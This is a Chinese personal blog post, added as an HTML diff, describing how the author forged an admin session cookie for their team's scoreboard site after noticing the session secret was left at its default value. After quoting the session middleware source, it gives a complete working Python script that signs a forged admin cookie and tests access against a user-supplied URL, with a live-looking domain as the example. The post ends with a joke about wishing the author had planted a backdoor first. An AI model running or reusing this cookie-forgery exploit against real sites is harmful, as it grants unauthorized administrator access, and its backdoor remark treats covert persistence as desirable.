@@ -1,0 +1,417 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-splash="0">
+  <head>
+    <!-- meta information -->
+<meta charset="utf-8">
+<script>
+  // 这段必须在首次绘制前跑完，否则会闪白/闪一下页面
+  (function () {
+    var root = document.documentElement;
+
+    // 1) 主题：先 localStorage，再跟随系统
+    var t = null;
+    try { t = localStorage.getItem('blog-theme'); } catch (e) { }
+    if (!t) t = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    root.setAttribute('data-theme', t);
+
+    // 2) 有 JS 才显示开场/转场遮罩；没有 JS 时页面照常可读
+    root.classList.add('js');
+    var wantsSplash = root.getAttribute('data-splash') === '1';
+    var seen = false;
+    try { seen = sessionStorage.getItem('blog-splash') === '1'; } catch (e) { }
+    if (wantsSplash && !seen) {
+      root.classList.add('has-splash');
+    } else {
+      // 这次是「进场」，先让转场遮罩合上，再由 JS 打开
+      root.classList.add('enter-transition');
+    }
+  })();
+</script>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<meta name="description" content="战队积分榜的漏洞挖掘今天和一诺开玩笑说找积分榜的漏洞，结果晚上他真跟我说有，是secret-key的默认值没有修改，于是尝试通过这个漏洞拿下积分榜的shell。 先看源码： SESSION_SECRET=$&amp;#123;SESSION_SEC">
+<meta name="author" content="祈染安">
+<meta name="theme-color" content="#141414">
+
+<title>积分榜session伪造越权漏洞 &middot; 安的角落</title>
+
+<!-- icons -->
+<link rel="shortcut icon" href="/images/favicon.ico">
+
+<!-- stylesheets -->
+<link rel="stylesheet" href="/css/syntax.css">
+<link rel="stylesheet" href="/css/main.css">
+
+<!-- feed -->
+<link rel="alternate" href="/feed.xml" type="application/rss+xml" title="安的角落">
+
+  <meta name="generator" content="Hexo 7.3.0"></head>
+  <body>
+    <!--
+  磁力光标：四个直角括号，靠近可吸附元素时被“吸”过去并放大；
+  吸附目标的描边图标会同时被描一遍（见 frontend.js 的 drawIcon）。
+-->
+<div class="cursor" id="cursor" aria-hidden="true">
+  <div class="cursor_corner"></div>
+  <div class="cursor_corner"></div>
+  <div class="cursor_corner"></div>
+  <div class="cursor_corner"></div>
+  <div class="cursor_label" id="cursor-label"></div>
+</div>
+
+    <!--
+  转场动画：两张“纸”从中间合上/打开，接缝处是一排声波条，
+  右下角有一枚折角，打开时会把折角展开。
+  离开页面时合上 → 新页面打开，跨页也连贯（Hexo 也是多页站点）。
+-->
+<div class="transition" id="transition" aria-hidden="true">
+  <div class="transition_half transition_half--top"></div>
+  <div class="transition_half transition_half--bottom"></div>
+
+  <div class="transition_bars">
+    
+    <div class="transition_bar" style="--d: 0.000s"></div>
+    
+    <div class="transition_bar" style="--d: 0.012s"></div>
+    
+    <div class="transition_bar" style="--d: 0.024s"></div>
+    
+    <div class="transition_bar" style="--d: 0.036s"></div>
+    
+    <div class="transition_bar" style="--d: 0.048s"></div>
+    
+    <div class="transition_bar" style="--d: 0.060s"></div>
+    
+    <div class="transition_bar" style="--d: 0.072s"></div>
+    
+    <div class="transition_bar" style="--d: 0.084s"></div>
+    
+    <div class="transition_bar" style="--d: 0.096s"></div>
+    
+    <div class="transition_bar" style="--d: 0.108s"></div>
+    
+    <div class="transition_bar" style="--d: 0.120s"></div>
+    
+    <div class="transition_bar" style="--d: 0.132s"></div>
+    
+    <div class="transition_bar" style="--d: 0.144s"></div>
+    
+    <div class="transition_bar" style="--d: 0.156s"></div>
+    
+    <div class="transition_bar" style="--d: 0.168s"></div>
+    
+    <div class="transition_bar" style="--d: 0.180s"></div>
+    
+    <div class="transition_bar" style="--d: 0.192s"></div>
+    
+    <div class="transition_bar" style="--d: 0.204s"></div>
+    
+    <div class="transition_bar" style="--d: 0.216s"></div>
+    
+    <div class="transition_bar" style="--d: 0.228s"></div>
+    
+    <div class="transition_bar" style="--d: 0.240s"></div>
+    
+    <div class="transition_bar" style="--d: 0.252s"></div>
+    
+    <div class="transition_bar" style="--d: 0.264s"></div>
+    
+    <div class="transition_bar" style="--d: 0.276s"></div>
+    
+    <div class="transition_bar" style="--d: 0.288s"></div>
+    
+    <div class="transition_bar" style="--d: 0.300s"></div>
+    
+    <div class="transition_bar" style="--d: 0.312s"></div>
+    
+    <div class="transition_bar" style="--d: 0.324s"></div>
+    
+    <div class="transition_bar" style="--d: 0.336s"></div>
+    
+    <div class="transition_bar" style="--d: 0.348s"></div>
+    
+    <div class="transition_bar" style="--d: 0.360s"></div>
+    
+    <div class="transition_bar" style="--d: 0.372s"></div>
+    
+    <div class="transition_bar" style="--d: 0.384s"></div>
+    
+    <div class="transition_bar" style="--d: 0.396s"></div>
+    
+    <div class="transition_bar" style="--d: 0.408s"></div>
+    
+    <div class="transition_bar" style="--d: 0.420s"></div>
+    
+  </div>
+
+  <div class="transition_fold"></div>
+</div>
+
+    
+
+    
+<!--
+  头像独立于 .nav 之外：.nav 用 clip-path 从左侧张开，
+  如果头像在里面会被一起裁掉，就看不到“以头像为起点”的效果了。
+-->
+<a class="nav_logo" id="nav-logo" href="/"
+   aria-label="祈染安 的主页" data-magnetic data-cursor="回到主页">
+  <img src="/images/logo.png" alt="祈染安">
+</a>
+
+<nav class="nav" id="main-navigation" aria-label="主导航">
+  <div class="nav_items">
+    
+    <a class="nav_item"
+       href="/"
+       data-magnetic data-stroke data-cursor="主页">
+      <span class="nav_item_icon"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M3.2 10.7 12 3.4l8.8 7.3"/><path d="M5.7 9.9v10.3h12.6V9.9"/><path d="M9.8 20.2v-5.5h4.4v5.5"/></svg></span>
+      <span class="nav_item_label"><span>主页</span></span>
+    </a>
+    
+    <a class="nav_item"
+       href="/links/"
+       data-magnetic data-stroke data-cursor="友链">
+      <span class="nav_item_icon"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M10.2 13.8 13.8 10.2"/><path d="M12.5 7.1 14.1 5.5a3.4 3.4 0 0 1 4.8 4.8l-1.6 1.6"/><path d="M11.5 16.9 9.9 18.5a3.4 3.4 0 0 1-4.8-4.8l1.6-1.6"/></svg></span>
+      <span class="nav_item_label"><span>友链</span></span>
+    </a>
+    
+    <a class="nav_item"
+       href="/tags/"
+       data-magnetic data-stroke data-cursor="标签">
+      <span class="nav_item_icon"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M3.4 11.6V5.2a1.8 1.8 0 0 1 1.8-1.8h6.4l9 9-8.2 8.2-9-9Z"/><circle cx="8" cy="8" r="1.4"/></svg></span>
+      <span class="nav_item_label"><span>标签</span></span>
+    </a>
+    
+  </div>
+
+  <div class="nav_right">
+    <button class="nav_theme" id="theme-toggle" type="button"
+            data-magnetic data-stroke aria-label="切换深浅色" data-cursor="深浅色">
+      <span class="nav_item_icon nav_theme_icon nav_theme_icon--moon"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M20.6 14.2A8.6 8.6 0 0 1 9.8 3.4a8.6 8.6 0 1 0 10.8 10.8Z"/></svg></span>
+      <span class="nav_item_icon nav_theme_icon nav_theme_icon--sun"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><circle cx="12" cy="12" r="4.2"/><path d="M12 2.6v2.2M12 19.2v2.2M2.6 12h2.2M19.2 12h2.2M5.4 5.4l1.6 1.6M17 17l1.6 1.6M18.6 5.4 17 7M7 17l-1.6 1.6"/></svg></span>
+    </button>
+  </div>
+</nav>
+
+
+    <main class="page" id="page">
+      
+<article class="post wrap">
+  <header class="post_head">
+    <p class="post_head_date reveal"><span>2025.11.09</span></p>
+    <h1 class="post_head_title" data-split-lines>积分榜session伪造越权漏洞</h1>
+    
+    <p class="post_head_tag"><span class="tagpill">CTF</span></p>
+    
+  </header>
+
+  <div class="post_body" data-reveal-body>
+    <h1 id="战队积分榜的漏洞挖掘"><a href="#战队积分榜的漏洞挖掘" class="headerlink" title="战队积分榜的漏洞挖掘"></a>战队积分榜的漏洞挖掘</h1><p>今天和一诺开玩笑说找积分榜的漏洞，结果晚上他真跟我说有，是secret-key的默认值没有修改，于是尝试通过这个漏洞拿下积分榜的shell。  </p>
+<p>先看源码：</p>
+<pre class="language-python" data-language="python"><code class="language-python">SESSION_SECRET<span class="token operator">=</span>$<span class="token punctuation">&#123;</span>SESSION_SECRET<span class="token punctuation">:</span><span class="token operator">-</span>change<span class="token operator">-</span>me<span class="token punctuation">&#125;</span></code></pre>
+
+<p>下一步的思路是查看SESSION_SECRET的使用方式：</p>
+<pre class="language-python" data-language="python"><code class="language-python">app<span class="token punctuation">.</span>add_middleware<span class="token punctuation">(</span>SessionMiddleware<span class="token punctuation">,</span> secret_key<span class="token operator">=</span>SESSION_SECRET<span class="token punctuation">)</span></code></pre>
+
+<p>查看SessionMiddleware：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">SessionMiddleware</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>
+        self<span class="token punctuation">,</span>
+        app<span class="token punctuation">:</span> ASGIApp<span class="token punctuation">,</span>
+        secret_key<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">|</span> Secret<span class="token punctuation">,</span>
+        session_cookie<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"session"</span><span class="token punctuation">,</span>
+        max_age<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">|</span> <span class="token boolean">None</span> <span class="token operator">=</span> <span class="token number">14</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span><span class="token punctuation">,</span>  <span class="token comment"># 14 days, in seconds</span>
+        path<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"/"</span><span class="token punctuation">,</span>
+        same_site<span class="token punctuation">:</span> Literal<span class="token punctuation">[</span><span class="token string">"lax"</span><span class="token punctuation">,</span> <span class="token string">"strict"</span><span class="token punctuation">,</span> <span class="token string">"none"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"lax"</span><span class="token punctuation">,</span>
+        https_only<span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span>
+        domain<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">|</span> <span class="token boolean">None</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
+    <span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>app <span class="token operator">=</span> app
+        self<span class="token punctuation">.</span>signer <span class="token operator">=</span> itsdangerous<span class="token punctuation">.</span>TimestampSigner<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>session_cookie <span class="token operator">=</span> session_cookie
+        self<span class="token punctuation">.</span>max_age <span class="token operator">=</span> max_age
+        self<span class="token punctuation">.</span>path <span class="token operator">=</span> path
+        self<span class="token punctuation">.</span>security_flags <span class="token operator">=</span> <span class="token string">"httponly; samesite="</span> <span class="token operator">+</span> same_site
+        <span class="token keyword">if</span> https_only<span class="token punctuation">:</span>  <span class="token comment"># Secure flag can be used with HTTPS only</span>
+            self<span class="token punctuation">.</span>security_flags <span class="token operator">+=</span> <span class="token string">"; secure"</span>
+        <span class="token keyword">if</span> domain <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+            self<span class="token punctuation">.</span>security_flags <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"; domain=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>domain<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
+
+    <span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">__call__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> scope<span class="token punctuation">:</span> Scope<span class="token punctuation">,</span> receive<span class="token punctuation">:</span> Receive<span class="token punctuation">,</span> send<span class="token punctuation">:</span> Send<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> scope<span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">"http"</span><span class="token punctuation">,</span> <span class="token string">"websocket"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># pragma: no cover</span>
+            <span class="token keyword">await</span> self<span class="token punctuation">.</span>app<span class="token punctuation">(</span>scope<span class="token punctuation">,</span> receive<span class="token punctuation">,</span> send<span class="token punctuation">)</span>
+            <span class="token keyword">return</span>
+
+        connection <span class="token operator">=</span> HTTPConnection<span class="token punctuation">(</span>scope<span class="token punctuation">)</span>
+        initial_session_was_empty <span class="token operator">=</span> <span class="token boolean">True</span>
+
+        <span class="token keyword">if</span> self<span class="token punctuation">.</span>session_cookie <span class="token keyword">in</span> connection<span class="token punctuation">.</span>cookies<span class="token punctuation">:</span>
+            data <span class="token operator">=</span> connection<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span>self<span class="token punctuation">.</span>session_cookie<span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
+            <span class="token keyword">try</span><span class="token punctuation">:</span>
+                data <span class="token operator">=</span> self<span class="token punctuation">.</span>signer<span class="token punctuation">.</span>unsign<span class="token punctuation">(</span>data<span class="token punctuation">,</span> max_age<span class="token operator">=</span>self<span class="token punctuation">.</span>max_age<span class="token punctuation">)</span>
+                scope<span class="token punctuation">[</span><span class="token string">"session"</span><span class="token punctuation">]</span> <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
+                initial_session_was_empty <span class="token operator">=</span> <span class="token boolean">False</span>
+            <span class="token keyword">except</span> BadSignature<span class="token punctuation">:</span>
+                scope<span class="token punctuation">[</span><span class="token string">"session"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            scope<span class="token punctuation">[</span><span class="token string">"session"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+
+        <span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">send_wrapper</span><span class="token punctuation">(</span>message<span class="token punctuation">:</span> Message<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> message<span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"http.response.start"</span><span class="token punctuation">:</span>
+                <span class="token keyword">if</span> scope<span class="token punctuation">[</span><span class="token string">"session"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+                    <span class="token comment"># We have session data to persist.</span>
+                    data <span class="token operator">=</span> b64encode<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>scope<span class="token punctuation">[</span><span class="token string">"session"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                    data <span class="token operator">=</span> self<span class="token punctuation">.</span>signer<span class="token punctuation">.</span>sign<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+                    headers <span class="token operator">=</span> MutableHeaders<span class="token punctuation">(</span>scope<span class="token operator">=</span>message<span class="token punctuation">)</span>
+                    header_value <span class="token operator">=</span> <span class="token string">"&#123;session_cookie&#125;=&#123;data&#125;; path=&#123;path&#125;; &#123;max_age&#125;&#123;security_flags&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>
+                        session_cookie<span class="token operator">=</span>self<span class="token punctuation">.</span>session_cookie<span class="token punctuation">,</span>
+                        data<span class="token operator">=</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                        path<span class="token operator">=</span>self<span class="token punctuation">.</span>path<span class="token punctuation">,</span>
+                        max_age<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"Max-Age=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>max_age<span class="token punctuation">&#125;</span></span><span class="token string">; "</span></span> <span class="token keyword">if</span> self<span class="token punctuation">.</span>max_age <span class="token keyword">else</span> <span class="token string">""</span><span class="token punctuation">,</span>
+                        security_flags<span class="token operator">=</span>self<span class="token punctuation">.</span>security_flags<span class="token punctuation">,</span>
+                    <span class="token punctuation">)</span>
+                    headers<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"Set-Cookie"</span><span class="token punctuation">,</span> header_value<span class="token punctuation">)</span>
+                <span class="token keyword">elif</span> <span class="token keyword">not</span> initial_session_was_empty<span class="token punctuation">:</span>
+                    <span class="token comment"># The session has been cleared.</span>
+                    headers <span class="token operator">=</span> MutableHeaders<span class="token punctuation">(</span>scope<span class="token operator">=</span>message<span class="token punctuation">)</span>
+                    header_value <span class="token operator">=</span> <span class="token string">"&#123;session_cookie&#125;=&#123;data&#125;; path=&#123;path&#125;; &#123;expires&#125;&#123;security_flags&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>
+                        session_cookie<span class="token operator">=</span>self<span class="token punctuation">.</span>session_cookie<span class="token punctuation">,</span>
+                        data<span class="token operator">=</span><span class="token string">"null"</span><span class="token punctuation">,</span>
+                        path<span class="token operator">=</span>self<span class="token punctuation">.</span>path<span class="token punctuation">,</span>
+                        expires<span class="token operator">=</span><span class="token string">"expires=Thu, 01 Jan 1970 00:00:00 GMT; "</span><span class="token punctuation">,</span>
+                        security_flags<span class="token operator">=</span>self<span class="token punctuation">.</span>security_flags<span class="token punctuation">,</span>
+                    <span class="token punctuation">)</span>
+                    headers<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"Set-Cookie"</span><span class="token punctuation">,</span> header_value<span class="token punctuation">)</span>
+            <span class="token keyword">await</span> send<span class="token punctuation">(</span>message<span class="token punctuation">)</span>
+
+        <span class="token keyword">await</span> self<span class="token punctuation">.</span>app<span class="token punctuation">(</span>scope<span class="token punctuation">,</span> receive<span class="token punctuation">,</span> send_wrapper<span class="token punctuation">)</span>
+</code></pre>
+
+<p>有了密钥和加密脚本，接下来就用ai跑一份伪造脚本。</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itsdangerous
+<span class="token keyword">import</span> json
+<span class="token keyword">import</span> base64
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> urllib3
+
+SECRET_KEY <span class="token operator">=</span> <span class="token string">"change-me"</span>
+ADMIN_USER_ID <span class="token operator">=</span> <span class="token number">1</span>
+
+<span class="token keyword">def</span> <span class="token function">forge_admin_cookie</span><span class="token punctuation">(</span>secret_key<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> admin_id<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""根据给定的密钥和用户ID，生成伪造的会话 Cookie。"""</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] 正在为 user_id: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>admin_id<span class="token punctuation">&#125;</span></span><span class="token string"> 生成会话..."</span></span><span class="token punctuation">)</span>
+    target_session_payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"user_id"</span><span class="token punctuation">:</span> admin_id<span class="token punctuation">&#125;</span>
+    signer <span class="token operator">=</span> itsdangerous<span class="token punctuation">.</span>TimestampSigner<span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span>
+    json_payload <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>target_session_payload<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
+    b64_payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64encode<span class="token punctuation">(</span>json_payload<span class="token punctuation">)</span>
+    signed_data <span class="token operator">=</span> signer<span class="token punctuation">.</span>sign<span class="token punctuation">(</span>b64_payload<span class="token punctuation">)</span>
+    forged_cookie_value <span class="token operator">=</span> signed_data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 伪造的 Cookie: session=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>forged_cookie_value<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> forged_cookie_value
+
+<span class="token keyword">def</span> <span class="token function">attempt_access</span><span class="token punctuation">(</span>target_url<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> cookie_value<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">"""使用伪造的 Cookie 尝试访问目标 URL。"""</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] 正在尝试以管理员身份访问: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_url<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+    
+    cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"session"</span><span class="token punctuation">:</span> cookie_value<span class="token punctuation">&#125;</span>
+    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"</span>
+    <span class="token punctuation">&#125;</span>
+
+    urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>urllib3<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InsecureRequestWarning<span class="token punctuation">)</span>
+    
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+        
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n--- 响应分析 ---"</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 响应状态码: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>response<span class="token punctuation">.</span>status_code<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        
+        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
+            response_text <span class="token operator">=</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token string">"admin"</span> <span class="token keyword">in</span> response_text <span class="token keyword">or</span> <span class="token string">"dashboard"</span> <span class="token keyword">in</span> response_text <span class="token keyword">or</span> <span class="token string">"logout"</span> <span class="token keyword">in</span> response_text <span class="token keyword">or</span> <span class="token string">"welcome"</span> <span class="token keyword">in</span> response_text<span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"成功 响应内容包含管理员关键词。您很可能已获得管理员权限。"</span><span class="token punctuation">)</span>
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"注意: 状态码为 200，但未检测到明显的管理员关键词。请手动检查响应内容。"</span><span class="token punctuation">)</span>
+        <span class="token keyword">elif</span> response<span class="token punctuation">.</span>status_code <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">301</span><span class="token punctuation">,</span> <span class="token number">302</span><span class="token punctuation">,</span> <span class="token number">303</span><span class="token punctuation">,</span> <span class="token number">307</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            redirect_location <span class="token operator">=</span> response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Location"</span><span class="token punctuation">,</span> <span class="token string">"N/A"</span><span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"失败 服务器重定向至: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>redirect_location<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token string">"login"</span> <span class="token keyword">in</span> redirect_location<span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"   (这通常意味着会话无效，被强制跳转到登录页面)"</span><span class="token punctuation">)</span>
+        <span class="token keyword">elif</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">403</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"失败 服务器返回 403 Forbidden (禁止访问)。"</span><span class="token punctuation">)</span>
+        <span class="token keyword">elif</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">401</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"失败 服务器返回 401 Unauthorized (未授权)。"</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"失败 收到意外的状态码 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>response<span class="token punctuation">.</span>status_code<span class="token punctuation">&#125;</span></span><span class="token string">。"</span></span><span class="token punctuation">)</span>
+            
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n--- 响应内容预览 (前500字符) ---"</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------------------"</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>RequestException <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n错误: 请求失败。请检查 URL 和网络连接。"</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"   详细信息: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    forged_cookie <span class="token operator">=</span> forge_admin_cookie<span class="token punctuation">(</span>SECRET_KEY<span class="token punctuation">,</span> ADMIN_USER_ID<span class="token punctuation">)</span>
+    target <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[?] 请输入您要测试的完整 URL (例如 https://score.cloudever.top/admin): "</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> target<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"http"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"错误：请输入包含 http:// 或 https:// 的完整 URL。"</span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        attempt_access<span class="token punctuation">(</span>target<span class="token punctuation">,</span> forged_cookie<span class="token punctuation">)</span></code></pre>
+<p>之后的准备抽时间再研究以下。  </p>
+<p>ps：应该先留个后门再告诉一诺的。。</p>
+
+  </div>
+
+  <nav class="post_nav" aria-label="文章导航">
+    
+    <a class="post_nav_item" href="/N1-2%E6%9C%88/"
+       data-magnetic data-stroke data-cursor="上一篇">
+      <span class="post_nav_label">上一篇</span>
+      <span class="post_nav_title">N1的2月题</span>
+    </a>
+    
+    
+    <a class="post_nav_item post_nav_item--next" href="/UofTCTF%E5%A4%8D%E7%8E%B0/"
+       data-magnetic data-stroke data-cursor="下一篇">
+      <span class="post_nav_label">下一篇</span>
